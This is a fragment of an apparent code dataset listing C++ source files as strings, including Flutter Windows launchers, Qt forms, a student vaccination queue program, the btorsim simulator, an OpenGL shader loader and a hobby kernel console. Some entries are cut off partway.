STATUS_SUCCESS;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"new_project\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Citizen {\n    string name;\n    int ID;\n    string password;\n    string gender;\n    int age;\n    string government;\n    string country;\n    bool vaccinated;\n    int numbers_of_vaccinated;\n};\n\nclass Node {\npublic:\n    Citizen data;\n    Node* next;\n\n    Node(const Citizen& citizen) {\n        data = citizen;\n        next = NULL;\n    }\n};\n\nclass WaitingList {\npublic:\n    Node* front;\n    Node* rear;\n\n    WaitingList() {\n        this->front = NULL;\n        this->rear = NULL;\n    }\n\n    bool IsEmpty() {\n        return front == NULL;\n    }\n\n    void AddToWaitingList(const Citizen& citizen) {\n        Node* newNode = new Node(citizen);\n        if (IsEmpty()) {\n            front = rear = newNode;\n        }\n        else {\n            rear->next = newNode;\n            rear = newNode;\n        }\n    }\n\n    void RemoveFromWaitingList() {\n        if (IsEmpty()) {\n            cout << \"The WaitingList is Empty.......\" << endl;\n        }\n        else if (front == rear) {\n            Node* delptr = front;\n            front = rear = NULL;\n            delete delptr;\n        }\n        else {\n            Node* delptr = front;\n            front = front->next;\n            delete delptr;\n        }\n        cout << \"The Citizen Vaccined...\\n\";\n    }\n\n    void Display() {\n        if (IsEmpty()) {\n            cout << \"The WaitingList is Empty.......\" << endl;\n        }\n        else {\n            Node* temp = front;\n            int i = 1;\n            while (temp != NULL) {\n                cout << \"---------------------------------------\" << endl;\n                cout << \"Citizen Info No.\" << i << \" Is : \" << endl;\n                cout << \"Name Is : \" << temp->data.name << endl;\n                cout << \"National ID Is : \" << temp->data.ID << endl;\n                cout << \"Password Is : \" << temp->data.password << endl;\n                cout << \"Gender Is : \" << temp->data.gender << endl;\n                cout << \"Age Is : \" << temp->data.age << endl;\n                cout << \"Government Is : \" << temp->data.government << endl;\n                cout << \"Country Is : \" << temp->data.country << endl;\n                cout << \"VaccinatedState Is : \" << temp->data.vaccinated << endl;\n                cout << \"---------------------------------------\" << endl;\n                temp = temp->next;\n                i++;\n            }\n            cout << endl;\n        }\n    }\n};\n\nclass Citizens {\nprivate:\n    Node* head;\n\npublic:\n    Citizens() {\n        head = NULL;\n    }\n\n    bool isEmpty() {\n        return (head == NULL);\n    }\n\n    void add(const Citizen& citizen) {\n        Node* newNode = new Node(citizen);\n        if (isEmpty()) {\n            head = newNode;\n        }\n        else {\n            newNode->next = head;\n            head = newNode;\n        }\n    }\n\n    bool isFound(const int& ID, const string& password) {\n        bool found = false;\n        Node* temp = head;\n        while (temp != NULL) {\n            if (temp->data.ID == ID && temp->data.password == password) {\n                found = true;\n                break;\n            }\n            temp = temp->next;\n        }\n        return found;\n    }\n\n    void displayCitizen(const int& ID, const string& password) {\n        Node* temp = head;\n        while (temp != NULL) {\n            if (isFound(ID, password)) {\n                cout << \"---------------------------------------\" << endl;\n                cout << \"Your Personal Info Is : \" << endl;\n                cout << \"Your Name Is : \" << temp->data.name << endl;\n                cout << \"Your National ID Is : \" << temp->data.ID << endl;\n                cout << \"Your Password Is : \" << temp->data.password << endl;\n                cout << \"Your Gender Is : \" << temp->data.gender << endl;\n                cout << \"Your Age Is : \" << temp->data.age << endl;\n                cout << \"Your Government Is : \" << temp->data.government << endl;\n                cout << \"Your Country Is : \" << temp->data.country << endl;\n                cout << \"Your VaccinatedState Is : \" << temp->data.vaccinated << endl;\n                cout << \"Your Taken Number Of doses Is : \" << temp->data.numbers_of_vaccinated << endl;\n                cout << \"---------------------------------------\" << endl;\n                break;\n            }\n            temp = temp->next;\n        }\n\n        if (!isFound(ID, password)) {\n            cout << \"This citizen Not Found.......\\n\";\n        }\n    }\n\n    void DeleteCitizen(const int& ID, const string& password) {\n        Node* delptr = head;\n        Node* prv = NULL;\n        while (delptr != NULL && !isFound(ID, password)) {\n            prv = delptr;\n            delptr = delptr->next;\n        }\n\n        if (delptr == NULL) {\n            cout << \"This citizen Not Found.......\\n\";\n            return;\n        }\n\n        if (prv == NULL) {\n            head = head->next;\n            delete delptr;\n        }\n        else {\n            prv->next = delptr->next;\n            delete delp",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"test_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"signup.h\"\r\n#include \"ui_signup.h\"\r\n#include <QMessageBox>\r\n#include \"login.h\"\r\n\r\nsignup::signup(QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::signup)\r\n{\r\n    ui->setupUi(this);\r\n}\r\n\r\nsignup::~signup()\r\n{\r\n    delete ui;\r\n}\r\n\r\n//\u6ce8\u518c\u7528\u6237\u64cd\u4f5c\r\nvoid signup::on_sureButton_clicked()\r\n{\r\n    //\u4ece\u884c\u7f16\u8f91\u5668\u4e2d\u83b7\u53d6\uff0c\u7528\u6237\u7684\u540d\u79f0\u3001\u5bc6\u7801\u548c\u786e\u8ba4\u5bc6\u7801\r\n    QString username = ui->usernameLineEdit->text();\r\n    QString password = ui->passwordLineEdit->text();\r\n    QString surepassword = ui->surePasswordLineEdit->text();\r\n    //\u5148\u8fdb\u884c\u4e24\u6b21\u5bc6\u7801\u662f\u5426\u8f93\u5165\u4e00\u81f4\u7684\u68c0\u67e5\r\n    if(password.toStdString() == surepassword.toStdString())\r\n    {\r\n        //\u8c03\u7528\u6570\u636e\u5e93\u4e2d\u65b0\u52a0\u7528\u6237\u7684\u64cd\u4f5c\u3002\u6240\u63d0\u4f9b\u7684\u51fd\u6570\u81ea\u5e26\u4e86\u7528\u6237\u540d\u91cd\u590d\u68c0\u67e5\u62a5\u9519\u3002\r\n        if(Database::getInstance().registerUser(username, password))\r\n        {\r\n        //\u5f39\u51fa\u6d88\u606f\u6846\r\n        QMessageBox::information(this, \"\u795d\u8d3a\", \"\u6ce8\u518c\u6210\u529f!\");\r\n        }\r\n        else\r\n        {\r\n        QMessageBox::warning(this, \"\u554a\u54e6\", \"\u51fa\u4e86\u4e00\u70b9\u95ee\u9898~ \u8bf7\u6362\u4e00\u4e2a\u7528\u6237\u540d\uff0c\u5e76\u786e\u8ba4\u6240\u6709\u7684\u4fe1\u606f\u90fd\u5df2\u586b\u5199\uff01\");\r\n        }\r\n    }\r\n    else\r\n    {\r\n        QMessageBox::warning(this, \"\u554a\u54e6\", \"\u51fa\u4e86\u4e00\u70b9\u95ee\u9898~ \u8bf7\u786e\u8ba4\u4e24\u6b21\u5bc6\u7801\u8f93\u5165\u4e00\u81f4\uff01\");\r\n    }\r\n}\r\n\r\n//\u8fd4\u56de\u5230\u767b\u5f55\u754c\u9762\r\nvoid signup::on_returnButton_clicked()\r\n{\r\n    this -> close();\r\n    login *l = new login;\r\n    l -> show();\r\n}\r\n",
    "#include<iostream>\n#include<vector>\n#include<string>\nusing namespace std;\nbool isValid(string s){\n    int i=0;\n    vector<char> stack;\n    // cout<<s[5]<<\" \"<<s.length()<<endl;\n    while(i<s.length()){\n        char ch=s.at(i);\n        if(ch=='(' || ch=='{' || ch=='['){\n            stack.push_back(ch);\n        }\n\n        else{\n            switch(ch){\n                case ')':\n                    if(stack.back()!='('){\n                        return 0;\n                    }\n                    break;\n                case ']':\n                    if(stack.back()!='['){\n                        return 0;\n                    }\n                    break;\n                case '}':\n                    if(stack.back()!='{'){\n                        return 0;\n                    }\n                    break;\n            }\n            \n            stack.pop_back();\n        }\n        i++;\n        cout<<i<<endl;\n    }\n    if(stack.size()!=0){\n        return 0;\n    }\n    return 1;   \n}\n\n\nint main()\n{\n    string ch=\"(){}}{\";\n    cout<<\"ans=\"<<isValid(ch);\n    return 0;\n}",
    "/**\n *  Btor2Tools: A tool package for the BTOR format.\n *\n *  Copyright (c) 2018 Armin Biere.\n *  Copyright (c) 2018 Aina Niemetz.\n *  Copyright (c) 2019 Mathias Preiner.\n *  Copyright (c) 2020 Nina Engelhardt.\n *\n *  All rights reserved.\n *\n *  This file is part of the Btor2Tools package.\n *  See LICENSE.txt for more information on using this software.\n */\n\n#include <assert.h>\n#include <ctype.h>\n#include <inttypes.h>\n#include <limits.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include <string>\n#include <vector>\n\n#include \"btor2parser/btor2parser.h\"\n#include \"btorsimbv.h\"\n#include \"btorsimrng.h\"\n#include \"btorsimstate.h\"\n#include \"btorsimvcd.h\"\n\n/*------------------------------------------------------------------------*/\n\nint32_t verbosity;\nstatic bool print_states;\n\nstatic const char *usage =\n    \"usage: btorsim [ <option> ... ] [ <btor> [ <witness> ] ]\\n\"\n    \"\\n\"\n    \"where <option> is one of the following\\n\"\n    \"\\n\"\n    \"  -h        print this command line option summary\\n\"\n    \"  -c        check only <witness> and do not print trace\\n\"\n    \"  -v        increase verbosity level (multiple times if necessary)\\n\"\n    \"  -r <n>    generate <n> random transitions (default 20)\\n\"\n    \"  -s <s>    random seed (default '0')\\n\"\n    \"\\n\"\n    \"  -b <n>    fake simulation to satisfy bad state property 'b<n>'\\n\"\n    \"  -j <n>    fake simulation to satisfy justice property 'j<n>'\\n\"\n    \"\\n\"\n    \"  --states                 print all states\\n\"\n    \"  --vcd <file>             write VCD trace to <file>\\n\"\n    \"  --hierarchical-symbols   interpret '.' in symbol names as hierarchical\\n\"\n    \"                           module path in VCD\\n\"\n    \"  --info <file>            read additional information for clocks and\\n\"\n    \"                           top module name from <file>\\n\"\n    \"\\n\"\n    \"and '<btor>' is sequential model in 'BTOR' format\\n\"\n    \"and '<witness>' a trace in 'BTOR' witness format.\\n\"\n    \"\\n\"\n    \"The simulator either checks a given witness (checking mode) or\\n\"\n    \"randomly generates inputs (random mode). If no BTOR model path is\\n\"\n    \"specified then it is read from '<stdin>'.  The simulator only uses\\n\"\n    \"checking mode if both the BTOR model and a witness file are specified.\\n\";\n\nstatic const char *model_path;\nstatic const char *witness_path;\nstatic FILE *model_file;\nstatic FILE *witness_file;\nstatic int32_t close_model_file;\nstatic int32_t close_witness_file;\n\nstatic bool dump_vcd   = false;\nstatic bool symbol_fmt = false;\n#ifdef NDEBUG\nstatic const bool readable_vcd = false;\n#else\nstatic const bool readable_vcd = true;\n#endif\n\nstatic const char *vcd_path;\nstatic BtorSimVCDWriter *vcd_writer;\n\nstatic int32_t\nparse_int (const char *str, int32_t *res_ptr)\n{\n  const char *p = str;\n  if (!*p) return 0;\n  if (*p == '0' && p[1]) return 0;\n  int32_t res = 0;\n  while (*p)\n  {\n    const int32_t ch = *p++;\n    if (!isdigit (ch)) return 0;\n    if (INT_MAX / 10 < res) return 0;\n    res *= 10;\n    const int32_t digit = ch - '0';\n    if (INT_MAX - digit < res) return 0;\n    res += digit;\n  }\n  *res_ptr = res;\n  return 1;\n}\n\nstatic int32_t\nparse_long (const char *str, int64_t *res_ptr)\n{\n  const char *p = str;\n  if (!*p) return 0;\n  if (*p == '0' && p[1]) return 0;\n  int64_t res = 0;\n  while (*p)\n  {\n    const int32_t ch = *p++;\n    if (!isdigit (ch)) return 0;\n    if (LONG_MAX / 10 < res) return 0;\n    res *= 10;\n    const int32_t digit = ch - '0';\n    if (LONG_MAX - digit < res) return 0;\n    res += digit;\n  }\n  *res_ptr = res;\n  return 1;\n}\n\nstatic int32_t checking_mode = 0;\nstatic int32_t random_mode   = 0;\n\nstatic Btor2Parser *model;\n\nstatic std::vector<Btor2Line *> inputs;\nstatic std::vector<Btor2Line *> states;\nstatic std::vector<Btor2Line *> bads;\nstatic std::vector<Btor2Line *> constraints;\nstatic std::vector<Btor2Line *> justices;\n\nstatic std::vector<int64_t> reached_bads;\n\nstatic int64_t constraints_violated = -1;\nstatic int64_t num_unreached_bads;\n\nstatic std::map<int64_t, std::string> extra_constraints;\n\nstatic int64_t num_format_lines;\nstatic std::vector<Btor2Line *> inits;\nstatic std::vector<Btor2Line *> nexts;\n\nstatic std::vector<BtorSimState> current_state;\nstatic std::vector<BtorSimState> next_state;\n\nstatic void\nparse_model_line (Btor2Line *l)\n{\n  switch (l->tag)\n  {\n    case BTOR2_TAG_bad: {\n      int64_t i = (int64_t) bads.size ();\n      msg (2, \"bad %\" PRId64 \" at line %\" PRId64, i, l->lineno);\n      bads.push_back (l);\n      reached_bads.push_back (-1);\n      num_unreached_bads++;\n    }\n    break;\n\n    case BTOR2_TAG_constraint: {\n      int64_t i = (int64_t) constraints.size ();\n      msg (2, \"constraint %\" PRId64 \" at line %\" PRId64, i, l->lineno);\n      constraints.push_back (l);\n    }\n    break;\n\n    case BTOR2_TAG_init: inits[l->args[0]] = l; break;\n\n    case BTOR2_TAG_input: {\n      int64_t i = (int64_t) inputs.size ();\n      if (l->symbol)\n        msg (2,\n             \"input %\" PRId64 \" '%s' at line %\" PRId64,\n             i,\n             l-",
    "#include\"shaderClass.h\"\n\n// Reads a text file and outputs a string with everything in the text file\nstd::string get_file_contents(const char* filename) {\n\tstd::ifstream in(filename, std::ios::binary);\n\tif (in) {\n\t\tstd::string contents;\n\t\tin.seekg(0, std::ios::end);\n\t\tcontents.resize(in.tellg());\n\t\tin.seekg(0, std::ios::beg);\n\t\tin.read(&contents[0], contents.size());\n\t\tin.close();\n\t\treturn(contents);\n\t}\n\tthrow(errno);\n}\n\n// Constructor that build the Shader Program from 2 different shaders\nShader::Shader(const char* vertexFile, const char* fragmentFile) {\n\t// Read vertexFile and fragmentFile and store the strings\n\tstd::string vertexCode = get_file_contents(vertexFile);\n\tstd::string fragmentCode = get_file_contents(fragmentFile);\n\n\t// Convert the shader source strings into character arrays\n\tconst char* vertexSource = vertexCode.c_str();\n\tconst char* fragmentSource = fragmentCode.c_str();\n\n\t// Create Vertex Shader Object and get its reference\n\tGLuint vertexShader = glCreateShader(GL_VERTEX_SHADER);\n\t// Attach Vertex Shader source to the Vertex Shader Object\n\tglShaderSource(vertexShader, 1, &vertexSource, NULL);\n\t// Compile the Vertex Shader into machine code\n\tglCompileShader(vertexShader);\n\n\t// Create Fragment Shader Object and get its reference\n\tGLuint fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);\n\t// Attach Fragment Shader source to the Fragment Shader Object\n\tglShaderSource(fragmentShader, 1, &fragmentSource, NULL);\n\t// Compile the Vertex Shader into machine code\n\tglCompileShader(fragmentShader);\n\n\t// Create Shader Program Object and get its reference\n\tID = glCreateProgram();\n\t// Attach the Vertex and Fragment Shaders to the Shader Program\n\tglAttachShader(ID, vertexShader);\n\tglAttachShader(ID, fragmentShader);\n\t// Wrap-up/Link all the shaders together into the Shader Program\n\tglLinkProgram(ID);\n\n\t// Delete the now useless Vertex and Fragment Shader objects\n\tglDeleteShader(vertexShader);\n\tglDeleteShader(fragmentShader);\n}\n\n// Activates the Shader Program\nvoid Shader::Activate() {\n\tglUseProgram(ID);\n}\n\n// Deletes the Shader Program\nvoid Shader::Delete() {\n\tglDeleteProgram(ID);\n}",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <set>\n#include <unordered_set>\n#include <map>\n#include <unordered_map>\n#include <queue>\n#include <stack>\n#include <cmath>\n#include <random>\n#include <chrono>\n\n\n\nusing namespace std;\n\ntypedef long long ll;\n\n#define endl \"\\n\"\n\nconst ll mod = 1;\nconst ll INF = (ll)1e18;\n\nrandom_device rd;\nmt19937 gen(rd());\n\nclass Float16{\n    static const uint32_t mantissaShift = 42;\n    static const uint32_t expShiftMid   = 56;\n    static const uint32_t expShiftOut   = 52;\n    double dValue_;\n\npublic:\n    Float16(double in) : dValue_(in) {\n        uint64_t utmp;\n        memcpy(&utmp, &dValue_, sizeof utmp);\n        utmp = utmp >> mantissaShift;\n        utmp = utmp << mantissaShift;\n        const uint64_t maskExpMid = (63llu << expShiftMid);\n        const uint64_t maskExpOut = (15llu << expShiftOut);\n        const uint64_t maskExpLead = (1llu << 62);\n        const uint64_t maskMantissaD = (1llu << 63) + maskExpLead + maskExpMid + maskExpOut;\n        if (utmp & maskExpLead) {\n            if (utmp & maskExpMid) {\n                utmp = utmp | maskExpMid;\n                utmp = utmp & maskMantissaD;\n                utmp = utmp | maskExpOut;\n            }\n        } else {\n            if ((utmp & maskExpMid) != maskExpMid) {\n                utmp = 0;\n            }\n        }\n        memcpy(&dValue_, &utmp, sizeof utmp);\n    }\n\n    Float16() : dValue_(0) {}\n\n    Float16& operator=(const Float16& rhs) {\n        this->dValue_ = rhs.dValue_;\n        return *this;\n    }\n\n    Float16& operator=(const double& rhs) {\n        this->dValue_ = rhs;\n        uint64_t utmp;\n        memcpy(&utmp, &dValue_, sizeof utmp);\n        utmp = utmp >> mantissaShift;\n        utmp = utmp << mantissaShift;\n        memcpy(&dValue_, &utmp, sizeof utmp);\n        return *this;\n    }\n\n    friend Float16 operator+(const Float16& lhs, const Float16& rhs) {\n        double tmp = lhs.dValue_ + rhs.dValue_;\n        return Float16(tmp);\n    }\n\n    double convert2Double() { return dValue_; }\n};\n\ndouble add64(double a, double b) {\n    volatile double currResultDouble = a + b;\n    return currResultDouble;\n}\n\ndouble add32(double a, double b) {\n    float currResultSingle = static_cast<float>(a) + static_cast<float>(b);\n\n    return static_cast<double>(currResultSingle);\n}\n\ndouble add16(double a, double b) {\n    Float16 currResultHalf(0.);\n    currResultHalf = currResultHalf + Float16(a);\n    currResultHalf = currResultHalf + Float16(b);\n    return currResultHalf.convert2Double();\n}\n\ndouble true_sum(const vector<double>& vec) {\n    long double trueSum = 0;\n    long double correction = 0;\n    vector<double> dvtmp=vec;\n    sort(dvtmp.begin(),dvtmp.end(), [](const double x, const double y) {\n        return fabs(x) < fabs(y);\n    });\n    for (auto i : dvtmp) {\n        volatile long double y = static_cast<long double>(i) - correction;\n        volatile long double t = trueSum + y;\n        correction = (t - trueSum) - y;\n        trueSum = t;\n    }\n    return (double)trueSum;\n}\n\n\ndouble error(double a, double b) {\n\n    double s = a + b;\n    double a_ = s - b;\n    double b_ = s - a_;\n    double da = a - a_;\n    double db = b - b_;\n    double t = da + db;\n    return t;\n}\n\nint base10power(double x) {\n    if (x == 0) return 0;\n    return (int)floor(log10(abs(x)));\n\n}\n\nvector<pair<double, string>> input;\n\n\nbool cmp(pair<double, string>& x, pair<double, string>& y) {\n    return abs(x.first) < abs(y.first);\n}\n\nstruct group {\n    int l, r;\n    double avg;\n\n    group(int a, int b, double c) {\n        l = a;\n        r = b;\n        avg = c;\n    }\n};\n\n\nbool cmpGroup(group a, group b) {\n    return abs(a.avg) < abs(b.avg);\n}\n\n\n\nstruct state {\n    double sum;\n    int weight;\n    string answer;\n};\n\n\npair<double, string> divideAndConquer(int left, int right) {\n\n    if (left == right) {\n        if (left >= input.size() || left < 0) {\n            cout << \"s\";\n        }\n        return {input[left].first, input[left].second};\n    }\n    std::uniform_int_distribution<> random(left, right - 1);\n\n    int m = random(gen);\n\n\n    auto l = divideAndConquer(left, m);\n    auto r = divideAndConquer(m + 1, right);\n\n    long double sum = l.first + r.first;\n    double sum32 = (double)((float)l.first) + (double)((float)r.first);\n    double sum16 = add16(l.first, r.first);\n    pair<double, string> ret;\n    if (sum16 == sum) {\n        ret.first = sum16;\n        ret.second = \"{h:\" + l.second + \",\" + r.second + \"}\";\n    } else if (sum32 == sum) {\n        ret.first = sum32;\n        ret.second = \"{s:\" + l.second + \",\" + r.second + \"}\";\n    } else {\n        ret.first = ((double)l.first + (double)r.first);\n        ret.second = \"{d:\" + l.second + \",\" + r.second + \"}\";\n    }\n    return ret;\n}\n\n\npair<double, string> divideAndConquerEven(int left, int right) {\n\n    if (left == right) {\n        return {input[left].first, input[left].second};\n    }\n    int m = (left + right) / 2;\n\n    auto l = divideAndConquerEven(left, m);\n    auto r = divideAndConquerEven(m + 1, ri",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    this->gistwidget = new GistWidget();\n    this->ui->text_grid_layout->addWidget(this->gistwidget);\n    connect(this,&MainWindow::print,this->gistwidget,&GistWidget::givedata);\n    connect(this->gistwidget,&GistWidget::give_vector,this,&MainWindow::print_textedit);\n    connect(this,&MainWindow::get_filename,this->gistwidget,&GistWidget::savefile);\n    connect(this,&MainWindow::pushnum,this->gistwidget,&GistWidget::addnum);\n    connect(this,&MainWindow::erasenum,this->gistwidget,&GistWidget::erasenum);\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n    delete gistwidget;\n}\n\nbool is_number(const std::string& s) {\n    return !s.empty() && std::find_if(s.begin(), s.end(),[](const char& c){return !std::isdigit(c);}) == s.end();\n}\n\n\nvoid MainWindow::read_json(std::string& filename)\n{\n    this->gistwidget->setdata_json(filename);\n}\n\nvoid MainWindow::read_json(QString& filename)\n{\n    std::string str = filename.toStdString();\n    this->read_json(str);\n}\n\nvoid MainWindow::print_textedit(std::vector<int>& data)\n{\n    QString result = \"\";\n    for(int i = 0;i < data.size(); ++i)\n        result += QString::number(data[i]) + \"\\n\";\n    this->ui->output_textEdit->setText(result);\n}\n\nvoid MainWindow::on_openAction_triggered()\n{\n    QString filename = QFileDialog::getOpenFileName(0,\"Open dialog\",\"\",\"*.json\");\n    this->read_json(filename);\n    emit print();\n}\n\nvoid MainWindow::on_addButton_clicked()\n{\n    if(!(this->ui->addLineEdit->text() == \"\") ){\n        if(is_number(this->ui->addLineEdit->text().toStdString()))\n            emit pushnum(this->ui->addLineEdit->text().toInt());\n        else\n            QMessageBox::information(nullptr, \"error\", \"Empty input or less than zero input!\");\n    }\n\n    this->ui->addLineEdit->clear();\n}\n\nvoid MainWindow::on_saveHowAction_triggered()\n{\n    QString filename = QFileDialog::getSaveFileName(0,\"Open dialog\",\"\",\"*.json\");\n    emit get_filename(filename);\n}\n\nvoid MainWindow::on_eraseButton_clicked()\n{\n    if(!(this->ui->eraseLineEdit->text() == \"\"))\n        if(is_number(this->ui->eraseLineEdit->text().toStdString()))\n            if(this->ui->eraseLineEdit->text().toInt() >= 0)\n                emit SignalErasehNum(this->ui->eraseLineEdit->text().toInt());\n            else\n                QMessageBox::information(nullptr, \"error\", \"Input less than zero!\");\n        else\n            QMessageBox::information(nullptr, \"Mistake\", \"Wrong input!\");\n    this->ui->eraseLineEdit->clear();\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"animations_tut\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_crop_ocr\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"console.hpp\"\n#include \"ioports.hpp\"\n#include <stddef.h>\n\nstruct Char {\n    uint8_t thischar;\n    uint8_t color;\n};\n\nstatic Char* VIDEO_MEM = (Char*)0xb8000;\n\nconst size_t NUM_COLS = 80;\nconst size_t NUM_ROWS = 25;\n\nstatic size_t current_col = 0;\nstatic size_t current_row = 0;\nstatic uint8_t current_color = 0;\n\nstatic inline constexpr uint8_t calc_color(uint8_t foreground, uint8_t background) {\n    return foreground + (background << 4);\n}\n\nstatic void clear_row(size_t row) {\n    const Char empty = {' ', console::Color::BLACK};\n\n    for (size_t col = 0; col < NUM_COLS; col++) {\n        VIDEO_MEM[col + NUM_COLS * row] = empty;\n    }\n}\n\nstatic void clear_row(size_t row, uint8_t color) {\n    Char empty = {' ', calc_color(color, color)};\n\n    for (size_t col = 0; col < NUM_COLS; col++) {\n        VIDEO_MEM[col + NUM_COLS * row] = empty;\n    }\n}\n\nstatic void print_newline() {\n    current_col = 0;\n\n    if (current_row < NUM_ROWS - 1) {\n        current_row++;\n        return;\n    }\n\n    for (size_t row = 1; row < NUM_ROWS; row++) {\n        for (size_t col = 0; col < NUM_COLS; col++) {\n            Char character = VIDEO_MEM[col + NUM_COLS * row];\n            VIDEO_MEM[col + NUM_COLS * (row - 1)] = character;\n        }\n    }\n\n    clear_row(NUM_COLS - 1);\n}\n\nvoid console::putchar(char c) {\n    if (c == '\\n') {\n        print_newline();\n        return;\n    }\n\n    if (current_col > NUM_COLS) {\n        print_newline();\n    }\n\n    VIDEO_MEM[current_col + NUM_COLS * current_row] = {(uint8_t)c, current_color};\n\n    current_col++;\n}\n\nvoid console::printstr(const char* str) {\n    for (size_t i = 0; 1; i++) {\n        char c = (uint8_t)str[i];\n\n        if (c == '\\0') {\n            return;\n        }\n\n        putchar(c);\n    }\n}\n\nvoid console::clear() {\n    for (size_t i = 0; i < NUM_ROWS; i++) {\n        clear_row(i);\n    }\n}\n\nvoid console::clear(uint8_t color) {\n    for (size_t i = 0; i < NUM_ROWS; i++) {\n        clear_row(i, color);\n    }\n}\n\nvoid console::set_color(uint8_t foreground, uint8_t background) {\n    current_color = calc_color(foreground, background);\n}\n\nvoid console::disable_cursor() {\n    ioports::outb(0x3D4, 0x0A);\n    ioports::outb(0x3D5, 0x20);\n}\n",
